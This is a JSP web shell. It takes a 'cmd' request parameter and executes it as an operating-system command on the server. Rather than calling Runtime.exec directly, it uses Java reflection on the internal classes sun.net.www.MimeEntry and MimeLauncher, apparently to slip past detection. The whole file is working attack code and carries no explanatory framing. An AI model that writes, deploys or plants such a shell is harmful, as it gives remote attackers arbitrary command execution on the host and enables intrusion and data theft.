<%@ page import="java.io.*" %>
<%@ page import="java.net.URLConnection" %>
<%@ page import="java.net.URL" %>
<%@ page import="sun.net.www.MimeEntry" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    URLConnection urlConnection = new URL("http://127.0.0.1%s").openConnection();
    MimeEntry mimeEntry = new MimeEntry("naihe");
    Class meClass = MimeEntry.class;
    Field field = meClass.getDeclaredField("command");
    field.setAccessible(true);

    Field field2 = meClass.getDeclaredField("tempFileNameTemplate");
    field2.setAccessible(true);
    field2.set(mimeEntry,"naihe%s567");

    InputStream inputStream = new InputStream() {
        @Override
        public int read() throws IOException {
            return -1;
        }
    };

    Class mimeClass = Class.forName("sun.net.www.MimeLauncher");
    Constructor mimeCon = mimeClass.getDeclaredConstructor(MimeEntry.class,URLConnection.class,
            InputStream.class,String.class,String.class);
    mimeCon.setAccessible(true);
    Thread thread = (Thread) mimeCon.newInstance(mimeEntry, urlConnection, inputStream, "0","0");
    Field field3 = mimeClass.getDeclaredField("execPath");
    field3.setAccessible(true);
    field3.set(thread,cmd);
    Method m = mimeClass.getDeclaredMethod("run");
    m.setAccessible(true);
    m.invoke(thread);
%>